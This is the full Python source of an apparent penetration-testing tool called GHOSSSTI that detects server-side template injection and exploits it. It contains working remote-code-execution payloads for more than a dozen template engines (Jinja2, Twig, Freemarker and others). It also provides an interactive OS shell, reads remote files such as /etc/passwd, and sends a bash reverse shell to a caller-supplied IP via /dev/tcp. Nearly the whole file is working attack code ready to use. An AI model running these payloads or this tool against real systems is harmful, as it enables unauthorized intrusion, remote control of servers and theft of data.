#!/usr/bin/env python3
"""
GHOSSSTI v3.5 - Ghost Ops Server-Side Template Injection Tool
TWO-ENDPOINT SSTI SUPPORT - Injection point separate from execution point

For Ghost Ops Security - Professional Penetration Testing
"""

import requests
import argparse
import sys
import urllib.parse
import re
from typing import Dict, List, Tuple, Optional
from colorama import Fore, Style, init

init(autoreset=True)

class GhossSSTI:
    def __init__(self, url: str, parameter: str = None, method: str = "GET", 
                 data: Dict = None, headers: Dict = None, cookies: Dict = None,
                 proxy: str = None, timeout: int = 15, 
                 trigger_url: str = None, trigger_method: str = "GET",
                 trigger_data: Dict = None):
        self.url = url
        self.parameter = parameter
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {"User-Agent": "GHOSSSTI/3.5"}
        self.cookies = cookies or {}
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.timeout = timeout
        self.session = requests.Session()
        self.detected_engine = None
        self.vulnerable_param = None
        self.baseline_response = None
        self.capabilities = {}
        self.os_type = None
        
        # Two-endpoint support: injection URL vs execution URL
        self.trigger_url = trigger_url  # Where payload executes (e.g., receipt page)
        self.trigger_method = trigger_method.upper() if trigger_method else "GET"
        self.trigger_data = trigger_data or {}
        
        # Comprehensive tests for ALL engines to ensure proper differentiation
        self.engine_tests = {
            "Twig": [
                ("{{7*7}}", "49", "not"),
                ("{{7*'7'}}", "49", "not"),
                ("{{7+'7'}}", "14", "not"),
                ("{{_self}}", "Twig", "partial"),
                ("{{['test']|first}}", "test", "not"),
                ("{{['a','b','c']|length}}", "3", "not"),
                ("{{'test'|upper}}", "TEST", "not"),
                ("{{['a','b']|join}}", "ab", "not"),
                ("{{['a','b']|join(',')}}", "a,b", "not"),
                ("{{['x','y','z']|last}}", "z", "not"),
            ],
            "Jinja2": [
                ("{{7*7}}", "49", "not"),
                ("{{7*'7'}}", "7777777", "not"),
                ("{{config}}", "Config", "partial"),
                ("{{7+'7'}}", "77", "not"),
                ("{{'test'|upper}}", "TEST", "not"),
                ("{{['a','b','c']|length}}", "3", "not"),
            ],
            "Smarty": [
                ("{$smarty.version}", "Smarty", "partial"),
                ("{7*7}", "49", "not"),
                ("{$smarty.now}", "1", "partial"),
                ("{math equation='7*7'}", "49", "not"),
                ("{if 7>5}yes{/if}", "yes", "not"),
            ],
            "Freemarker": [
                ("${7*7}", "49", "not"),
                ("${.now}", "202", "partial"),  # Has year like 2025
                ("${'test'?upper_case}", "TEST", "not"),
                ("${7+7}", "14", "not"),
                ("${'a'+'b'}", "ab", "not"),
                ("${7-3}", "4", "not"),
                ("${'hello'?length}", "5", "not"),
                ("${.version}", "FreeMarker", "partial"),  # Version string
            ],
            "Velocity": [
                ("#set($x=7*7)$x", "49", "not"),
                ("#set($x=7)$x$x", "77", "not"),
                ("#set($x='test')$x.toUpperCase()", "TEST", "not"),
                ("#set($x=7)#set($y=7)$x$y", "77", "not"),
            ],
            "Mako": [
                ("${7*7}", "49", "not"),
                ("${'test'.upper()}", "TEST", "not"),
                ("${7+7}", "14", "not"),
            ],
            "Pug": [
                ("#{7*7}", "49", "not"),
                ("#{7+7}", "14", "not"),
            ],
            "ERB": [
                ("<%= 7*7 %>", "49", "not"),
                ("<%= 'test'.upcase %>", "TEST", "not"),
                ("<%= 7+7 %>", "14", "not"),
            ],
            "Tornado": [
                ("{{7*7}}", "49", "not"),
                ("{{7+7}}", "14", "not"),
            ],
            "Django": [
                ("{{7|add:7}}", "14", "not"),
                ("{{7|add:'7'}}", "77", "not"),
                ("{{'test'|upper}}", "TEST", "not"),
            ],
            "Handlebars": [
                ("{{7*7}}", "49", "not"),
            ],
            "Thymeleaf": [
                ("${7*7}", "49", "not"),
                ("${7+7}", "14", "not"),
            ],
            "Nunjucks": [
                ("{{7*7}}", "49", "not"),
                ("{{7+7}}", "14", "not"),
            ],
        }
        
        # RCE payloads
        self.rce_payloads = {
            "Twig": [
                "{{['{CMD}']|filter('system')}}",
                "{{['{CMD}']|filter('passthru')}}",
                "{{['{CMD}']|filter('exec')}}",
                "{{['{CMD}']|filter('shell_exec')}}",
                "{{['{CMD}']|map('system')|join}}",
                "{{['{CMD}']|map('passthru')|join}}",
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{CMD}')}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{CMD}')}}",
                "{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('{CMD}')}}",
            ],
            "Jinja2": [
                "{{config.__class__.__init__.__globals__['os'].popen('{CMD}').read()}}",
                "{{lipsum.__globals__.os.popen('{CMD}').read()}}",
                "{{cycler.__init__.__globals__.os.popen('{CMD}').read()}}",
                "{{joiner.__init__.__globals__.os.popen('{CMD}').read()}}",
            ],
            "Freemarker": [
                # Method 1: Execute utility (most common)
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{CMD}')}",
                # Method 2: ObjectConstructor with Runtime.exec
                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()><#assign rt=oc('java.lang.Runtime').getRuntime()><#assign proc=rt.exec('{CMD}')>${proc}",
                # Method 3: Alternative Execute syntax
                "<#assign ex='freemarker.template.utility.Execute'?new()><#assign result=ex('{CMD}')>${result}",
                # Method 4: ObjectConstructor with command array
                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()><#assign rt=oc('java.lang.Runtime')><#assign exec=rt.getRuntime().exec('{CMD}')>",
                # Method 5: JythonRuntime (if available)
                "<#assign ex='freemarker.template.utility.JythonRuntime'?new()><#assign os=ex.getModule('os')>${os.system('{CMD}')}",
            ],
            "Velocity": [
                "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))##\n#set($ex=$rt.getRuntime().exec('{CMD}'))##",
            ],
            "Smarty": [
                "{php}system('{CMD}');{/php}",
                "{php}echo `{CMD}`;{/php}",
            ],
            "Mako": [
                "<%import os%>${os.popen('{CMD}').read()}",
            ],
            "ERB": [
                "<%= `{CMD}` %>",
                "<%= system('{CMD}') %>",
            ],
            "Tornado": [
                "{% import os %}{{os.popen('{CMD}').read()}}",
            ],
            "Handlebars": [
                "{{#with 's' as |string|}}{{#with 'e'}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub 'constructor')}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push 'return require(\\'child_process\\').exec(\\'{CMD}\\');'}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
            ],
            "Nunjucks": [
                "{{range.constructor('return global.process.mainModule.require(\\'child_process\\').execSync(\\'{CMD}\\')')()}}",
            ],
            "Thymeleaf": [
                "${T(java.lang.Runtime).getRuntime().exec('{CMD}')}",
            ],
            "Django": [
                "{% load module %}",
            ],
        }

    def print_banner(self):
        banner = f"""
{Fore.CYAN}               ╔══════════════════════════════════════════════╗
{Fore.CYAN}               ║             {Fore.WHITE}👻 GHOSSSTI 👻{Fore.CYAN}                  ║
{Fore.CYAN}               ║  {Fore.YELLOW}Ghost Ops Server-Side Template Injection{Fore.CYAN}  ║
{Fore.CYAN}               ╚══════════════════════════════════════════════╝{Style.RESET_ALL}

{Fore.RED}    ██████{Fore.WHITE}╗ {Fore.RED}██{Fore.WHITE}╗  {Fore.RED}██{Fore.WHITE}╗ {Fore.RED}██████{Fore.WHITE}╗ {Fore.RED}███████{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.YELLOW}███████{Fore.WHITE}╗{Fore.YELLOW}████████{Fore.WHITE}╗{Fore.YELLOW}██{Fore.WHITE}╗
{Fore.RED}   ██{Fore.WHITE}╔════╝ {Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}╔═══{Fore.RED}██{Fore.WHITE}╗{Fore.RED}██{Fore.WHITE}╔════╝{Fore.RED}██{Fore.WHITE}╔════╝{Fore.YELLOW}██{Fore.WHITE}╔════╝╚══{Fore.YELLOW}██{Fore.WHITE}╔══╝{Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ██{Fore.WHITE}║  {Fore.RED}███{Fore.RED}███████{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║   {Fore.RED}██{Fore.WHITE}║{Fore.RED}███████{Fore.WHITE}╗{Fore.RED}███████{Fore.WHITE}╗{Fore.YELLOW}███████{Fore.WHITE}╗   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ██{Fore.WHITE}║   {Fore.RED}██{Fore.RED}██{Fore.WHITE}╔══{Fore.RED}██{Fore.WHITE}║{Fore.RED}██{Fore.WHITE}║   {Fore.RED}██{Fore.WHITE}║╚════{Fore.RED}██{Fore.WHITE}║╚════{Fore.RED}██{Fore.WHITE}║╚════{Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}   ╚██████{Fore.WHITE}╔╝{Fore.RED}██{Fore.WHITE}║  {Fore.RED}██{Fore.WHITE}║╚{Fore.RED}██████{Fore.WHITE}╔╝{Fore.RED}███████{Fore.WHITE}║{Fore.RED}███████{Fore.WHITE}║{Fore.YELLOW}███████{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║   {Fore.YELLOW}██{Fore.WHITE}║
{Fore.RED}    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝{Fore.YELLOW}╚══════╝   ╚═╝   ╚═╝{Style.RESET_ALL}

{Fore.GREEN}       ╔════════════════════════════════════════════════════════════╗
{Fore.GREEN}       ║  {Fore.CYAN}Two-Endpoint SSTI + Enhanced FreeMarker{Fore.GREEN}              ║
{Fore.GREEN}       ║  {Fore.WHITE}Multi-Stage {Fore.CYAN}•{Fore.WHITE} Accurate Detection {Fore.CYAN}•{Fore.WHITE} All Engines{Fore.GREEN}      ║
{Fore.GREEN}       ╠════════════════════════════════════════════════════════════╣
{Fore.GREEN}       ║  {Fore.YELLOW}✓ v3.5 Two-Stage  {Fore.WHITE}|  {Fore.RED}✓ Production Ready{Fore.GREEN}        ║
{Fore.GREEN}       ║  {Fore.MAGENTA}Ghost Ops Security - Professional Penetration Testing{Fore.GREEN} ║
{Fore.GREEN}       ╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
        """
        print(banner)

    def make_request(self, payload: str, param: str = None) -> Optional[str]:
        """Make HTTP request with payload - supports two-endpoint pattern"""
        try:
            if param is None:
                param = self.parameter
            
            if self.method == "GET":
                payload_encoded = urllib.parse.quote(payload, safe='')
            else:
                payload_encoded = payload
            
            # STEP 1: Inject payload at injection URL
            if self.method == "GET":
                params = {param: payload_encoded}
                inject_response = self.session.get(
                    self.url,
                    params=params,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            else:
                data = self.data.copy()
                data[param] = payload
                inject_response = self.session.post(
                    self.url,
                    data=data,
                    headers=self.headers,
                    cookies=self.cookies,
                    proxies=self.proxy,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
            
            # STEP 2: If trigger URL specified, visit it to see execution
            if self.trigger_url:
                if self.trigger_method == "GET":
                    trigger_response = self.session.get(
                        self.trigger_url,
                        data=self.trigger_data if self.trigger_data else None,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    trigger_response = self.session.post(
                        self.trigger_url,
                        data=self.trigger_data,
                        headers=self.headers,
                        cookies=self.cookies,
                        proxies=self.proxy,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                return trigger_response.text
            
            # No trigger URL: return injection response (standard single-endpoint pattern)
            return inject_response.text
            
        except Exception as e:
            return None

    def is_payload_executed(self, response: str, payload: str, expected: str, check_type: str) -> bool:
        """Check if payload was EXECUTED"""
        if not response:
            return False
        
        response_lower = response.lower()
        expected_lower = expected.lower()
        clean_payload = urllib.parse.unquote(payload).lower()
        
        has_expected = expected_lower in response_lower
        
        if check_type == "not":
            has_payload = clean_payload in response_lower
            if has_payload and len(payload) > 10:
                return False
            return has_expected
        elif check_type == "partial":
            return has_expected
        
        return False

    def detect_ssti(self) -> Tuple[bool, Optional[str], Optional[str]]:
        """Enhanced SSTI detection"""
        print(f"\n{Fore.YELLOW}[*] Starting SSTI/SSI detection...{Style.RESET_ALL}")
        
        if self.trigger_url:
            print(f"{Fore.CYAN}[*] Two-endpoint mode:{Style.RESET_ALL}")
            print(f"    Injection URL: {self.url}")
            print(f"    Trigger URL: {self.trigger_url}")
        
        if not self.parameter:
            params = self.find_parameters()
            if not params:
                print(f"{Fore.RED}[!] No parameters found{Style.RESET_ALL}")
                return False, None, None
        else:
            params = [self.parameter]
        
        for param in params:
            print(f"{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
            
            self.baseline_response = self.make_request("BASELINE_TEST", param)
            if not self.baseline_response:
                continue
            
            print(f"{Fore.YELLOW}[*] Running comprehensive engine detection (this may take a moment)...{Style.RESET_ALL}\n")
            
            engine = self.identify_engine_verified(param)
            if engine:
                self.vulnerable_param = param
                self.detected_engine = engine
                self.detect_capabilities()
                return True, engine, param
        
        print(f"{Fore.RED}[!] No SSTI vulnerability detected{Style.RESET_ALL}")
        return False, None, None

    def identify_engine_verified(self, param: str) -> Optional[str]:
        """Identify template engine with comprehensive testing - FIXED SCORING"""
        scores = {}
        
        # Test ALL engines
        for engine, tests in self.engine_tests.items():
            score = 0
            matches = []
            
            for payload, expected, check_type in tests:
                response = self.make_request(payload, param)
                
                if self.is_payload_executed(response, payload, expected, check_type):
                    score += 1
                    matches.append(payload)
            
            if score > 0:
                scores[engine] = {
                    'score': score,
                    'matches': matches,
                    'total_tests': len(tests),
                    'confidence': (score / len(tests)) * 100
                }
        
        if not scores:
            return None
        
        # CRITICAL FIX: Sort by ABSOLUTE SCORE first (most tests passed)
        # Then by confidence as tiebreaker
        # This ensures Twig with 6/10 beats Smarty with 3/3
        sorted_engines = sorted(scores.items(), 
                                key=lambda x: (x[1]['score'], x[1]['confidence']), 
                                reverse=True)
        
        # Print results
        print(f"{Fore.CYAN}[*] Detection Results (sorted by tests passed):{Style.RESET_ALL}")
        for engine, data in sorted_engines[:5]:
            score = data['score']
            total = data['total_tests']
            conf = data['confidence']
            
            if score >= 5:
                color = Fore.GREEN
                marker = "✓✓✓"
            elif score >= 3:
                color = Fore.YELLOW
                marker = "✓✓"
            else:
                color = Fore.RED
                marker = "✓"
            
            print(f"  {color}{marker} {engine}: {score}/{total} tests passed ({conf:.0f}% confidence){Style.RESET_ALL}")
        
        best_engine = sorted_engines[0][0]
        best_data = sorted_engines[0][1]
        
        print(f"\n{Fore.GREEN}[+] Engine CONFIRMED: {best_engine}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Tests Passed: {best_data['score']}/{best_data['total_tests']} ({best_data['confidence']:.0f}% confidence){Style.RESET_ALL}")
        
        return best_engine

    def detect_capabilities(self):
        """Detect exploitation capabilities"""
        print(f"\n{Fore.YELLOW}[*] Detecting capabilities...{Style.RESET_ALL}")
        
        if self.test_command_silent("echo GHOSSSTI_TEST", "GHOSSSTI_TEST"):
            self.capabilities['shell_cmd'] = True
            print(f"{Fore.GREEN}  [+] Shell command execution: OK{Style.RESET_ALL}")
            self.detect_os()
        else:
            self.capabilities['shell_cmd'] = False
            print(f"{Fore.YELLOW}  [-] Shell command execution: Failed{Style.RESET_ALL}")
        
        if self.test_file_read_silent():
            self.capabilities['file_read'] = True
            print(f"{Fore.GREEN}  [+] File read: OK{Style.RESET_ALL}")
        else:
            self.capabilities['file_read'] = False
            print(f"{Fore.YELLOW}  [-] File read: Failed{Style.RESET_ALL}")
        
        self.capabilities['file_write'] = False
        
        print(f"\n{Fore.CYAN}[+] SSTImap identified the following injection point:{Style.RESET_ALL}")
        print(f"\n  {Fore.WHITE}Parameter: {self.vulnerable_param}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}OS: {self.os_type or 'unknown'}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Capabilities:{Style.RESET_ALL}")
        print(f"    {Fore.GREEN if self.capabilities.get('shell_cmd') else Fore.RED}Shell command execution: {'OK' if self.capabilities.get('shell_cmd') else 'NO'}{Style.RESET_ALL}")
        print(f"    {Fore.GREEN if self.capabilities.get('file_read') else Fore.RED}File read: {'OK' if self.capabilities.get('file_read') else 'NO'}{Style.RESET_ALL}")
        print(f"    {Fore.RED}File write: NO{Style.RESET_ALL}")

    def test_command_silent(self, cmd: str, expected_output: str) -> bool:
        """Silently test if command execution works"""
        if not self.detected_engine or not self.vulnerable_param:
            return False
        
        if self.detected_engine not in self.rce_payloads:
            return False
        
        payloads = self.rce_payloads[self.detected_engine]
        
        for template in payloads[:2]:
            payload = template.replace("{CMD}", cmd)
            response = self.make_request(payload, self.vulnerable_param)
            
            if response and expected_output.lower() in response.lower():
                return True
        
        return False

    def test_file_read_silent(self) -> bool:
        """Silently test if file reading works"""
        return self.test_command_silent("cat /etc/passwd", "root:") or \
               self.test_command_silent("cat /etc/passwd", "/bin/bash")

    def detect_os(self):
        """Detect OS type"""
        if self.test_command_silent("uname", "Linux"):
            self.os_type = "posix-linux"
        elif self.test_command_silent("uname", "Darwin"):
            self.os_type = "posix-darwin"
        elif self.test_command_silent("cmd /c ver", "Windows"):
            self.os_type = "windows"
        else:
            self.os_type = "unknown"

    def find_parameters(self) -> List[str]:
        """Find test parameters"""
        params = []
        parsed = urllib.parse.urlparse(self.url)
        if parsed.query:
            params.extend(urllib.parse.parse_qs(parsed.query).keys())
        if self.data:
            params.extend(self.data.keys())
        if not params:
            params = ['name', 'user', 'search', 'q', 'template']
        return params

    def execute_command(self, command: str) -> Optional[str]:
        """Execute OS command and return output - FIXED"""
        if not self.capabilities.get('shell_cmd'):
            print(f"{Fore.RED}[!] Command execution not available{Style.RESET_ALL}")
            return None
        
        payloads = self.rce_payloads[self.detected_engine]
        
        for template in payloads:
            payload = template.replace("{CMD}", command)
            response = self.make_request(payload, self.vulnerable_param)  # Get RESPONSE not PAYLOAD!
            
            if response and response != self.baseline_response:
                # Check for command output indicators
                if "uid=" in response or "root:" in response or "www-data" in response or len(response) > 200:
                    return response  # Return RESPONSE not payload!
        
        return None

    def os_shell(self):
        """Interactive OS shell"""
        if not self.capabilities.get('shell_cmd'):
            print(f"{Fore.RED}[!] Shell command execution not available{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}[+] Run commands on the operating system{Style.RESET_ALL}")
        prompt = f"{self.os_type or 'shell'} $ "
        
        while True:
            try:
                cmd = input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL}").strip()
                
                if not cmd:
                    continue
                
                if cmd.lower() in ['exit', 'quit', 'q']:
                    break
                
                result = self.execute_command(cmd)
                if result:
                    output = self.extract_output(result)
                    print(output)
                else:
                    print(f"{Fore.YELLOW}[!] Command failed or no output{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Exiting shell...{Style.RESET_ALL}")
                break
            except EOFError:
                break

    def extract_output(self, response: str) -> str:
        """Extract command output from response - FIXED"""
        # Remove HTML tags
        text = re.sub(r'<[^>]+>', '\n', response)
        
        # Split into lines
        lines = text.split('\n')
        output_lines = []
        
        # Find lines with actual content
        for line in lines:
            line = line.strip()
            # Skip template boilerplate
            if line and not any(x in line.lower() for x in ['simple test server', 'your ip:', 'current time:', 'enter your name']):
                output_lines.append(line)
        
        if output_lines:
            result = '\n'.join(output_lines[:30])
            # Clean "Hi " prefix and "Array!" suffix common in Twig
            result = re.sub(r'^Hi\s+', '', result)
            result = re.sub(r'\s*Array!\s*$', '', result)
            result = result.strip()
            return result if result else response[:500]
        
        return response[:500]

    def read_file(self, filepath: str) -> Optional[str]:
        """Read remote file"""
        if not self.capabilities.get('file_read'):
            print(f"{Fore.RED}[!] File read not available{Style.RESET_ALL}")
            return None
        
        if self.os_type and "windows" in self.os_type:
            cmd = f"type {filepath}"
        else:
            cmd = f"cat {filepath}"
        
        return self.execute_command(cmd)

    def interactive_mode(self):
        """Interactive exploitation mode"""
        if not self.detected_engine:
            print(f"{Fore.RED}[!] No vulnerability detected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}╔═══════════════════════════════════════╗")
        print(f"║     Interactive Exploitation          ║")
        print(f"╚═══════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Engine: {self.detected_engine}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Parameter: {self.vulnerable_param}{Style.RESET_ALL}\n")
        
        if self.capabilities.get('shell_cmd'):
            print(f"{Fore.YELLOW}[*] Use 'os-shell' to get interactive OS command shell{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Available Commands:{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}os-shell{Style.RESET_ALL}          - Interactive OS shell")
        print(f"  {Fore.CYAN}os-cmd <cmd>{Style.RESET_ALL}      - Execute single OS command")
        print(f"  {Fore.CYAN}read <file>{Style.RESET_ALL}       - Read remote file")
        print(f"  {Fore.CYAN}shell <ip> <port>{Style.RESET_ALL} - Reverse shell")
        print(f"  {Fore.CYAN}test <payload>{Style.RESET_ALL}    - Test custom payload")
        print(f"  {Fore.CYAN}help{Style.RESET_ALL}              - Show this help")
        print(f"  {Fore.CYAN}quit{Style.RESET_ALL}              - Exit\n")
        
        while True:
            try:
                inp = input(f"{Fore.MAGENTA}GHOSSSTI>{Style.RESET_ALL} ").strip()
                
                if not inp:
                    continue
                
                if inp.lower() in ['quit', 'exit', 'q']:
                    break
                
                parts = inp.split(maxsplit=1)
                cmd = parts[0].lower()
                
                if cmd == 'os-shell':
                    self.os_shell()
                
                elif cmd == 'os-cmd' and len(parts) > 1:
                    result = self.execute_command(parts[1])
                    if result:
                        output = self.extract_output(result)
                        print(output)
                    else:
                        print(f"{Fore.YELLOW}[!] Command failed{Style.RESET_ALL}")
                
                elif cmd == 'read' and len(parts) > 1:
                    result = self.read_file(parts[1])
                    if result:
                        output = self.extract_output(result)
                        print(output)
                    else:
                        print(f"{Fore.YELLOW}[!] File read failed{Style.RESET_ALL}")
                
                elif cmd == 'shell' and len(inp.split()) >= 3:
                    shell_parts = inp.split()
                    ip = shell_parts[1]
                    port = shell_parts[2]
                    shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
                    print(f"{Fore.YELLOW}[!] Ensure listener: nc -lvnp {port}{Style.RESET_ALL}")
                    self.execute_command(shell_cmd)
                
                elif cmd == 'test' and len(parts) > 1:
                    payload = parts[1]
                    print(f"{Fore.YELLOW}[*] Testing payload:{Style.RESET_ALL} {payload}")
                    response = self.make_request(payload, self.vulnerable_param)
                    output = self.extract_output(response)
                    print(f"{Fore.CYAN}Response:{Style.RESET_ALL}\n{output}")
                
                elif cmd == 'help':
                    print(f"\n{Fore.WHITE}Commands:{Style.RESET_ALL}")
                    print(f"  os-shell          - Interactive OS shell")
                    print(f"  os-cmd <cmd>      - Execute single command")
                    print(f"  read <file>       - Read file")
                    print(f"  shell <ip> <port> - Reverse shell")
                    print(f"  test <payload>    - Test payload")
                    print(f"  quit              - Exit\n")
                
                else:
                    print(f"{Fore.RED}Unknown command. Type 'help' for available commands{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Use 'quit' to exit{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description="GHOSSSTI v3.5 - Ghost Ops SSTI Tool (Two-Endpoint Support)")
    parser.add_argument('-u', '--url', help='Target URL (injection point)')
    parser.add_argument('-p', '--parameter', help='Parameter to test')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('-d', '--data', help='POST data')
    parser.add_argument('-H', '--headers', help='Headers')
    parser.add_argument('-c', '--cookies', help='Cookies')
    parser.add_argument('--proxy', help='Proxy URL')
    parser.add_argument('--timeout', type=int, default=15)
    
    # Two-endpoint support
    parser.add_argument('--trigger-url', help='Trigger URL where payload executes (e.g., receipt page)')
    parser.add_argument('--trigger-method', default='GET', choices=['GET', 'POST'], help='Trigger URL method')
    parser.add_argument('--trigger-data', help='Trigger URL POST data')
    
    parser.add_argument('--os-shell', action='store_true', help='Interactive OS shell')
    parser.add_argument('--os-cmd', help='Execute OS command')
    parser.add_argument('--read', help='Read file')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    parser.add_argument('--detect-only', action='store_true')
    
    args = parser.parse_args()
    if not args.url:
        parser.print_help()
        sys.exit(1)
    
    data = {}
    if args.data:
        for pair in args.data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                data[k] = v
    
    headers = {}
    if args.headers:
        for line in args.headers.split('\\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
    
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                k, v = cookie.split('=', 1)
                cookies[k.strip()] = v.strip()
    
    trigger_data = {}
    if args.trigger_data:
        for pair in args.trigger_data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                trigger_data[k] = v
    
    scanner = GhossSSTI(
        url=args.url,
        parameter=args.parameter,
        method=args.method,
        data=data,
        headers=headers,
        cookies=cookies,
        proxy=args.proxy,
        timeout=args.timeout,
        trigger_url=args.trigger_url,
        trigger_method=args.trigger_method,
        trigger_data=trigger_data if trigger_data else None
    )
    
    scanner.print_banner()
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    vuln, engine, param = scanner.detect_ssti()
    
    if not vuln:
        sys.exit(1)
    
    if args.detect_only:
        sys.exit(0)
    
    if args.os_shell:
        scanner.os_shell()
    elif args.os_cmd:
        result = scanner.execute_command(args.os_cmd)
        if result:
            output = scanner.extract_output(result)
            print(f"\n{output}")
    elif args.read:
        result = scanner.read_file(args.read)
        if result:
            output = scanner.extract_output(result)
            print(f"\n{output}")
    elif args.interactive:
        scanner.interactive_mode()
    else:
        scanner.interactive_mode()


if __name__ == "__main__":
    main()
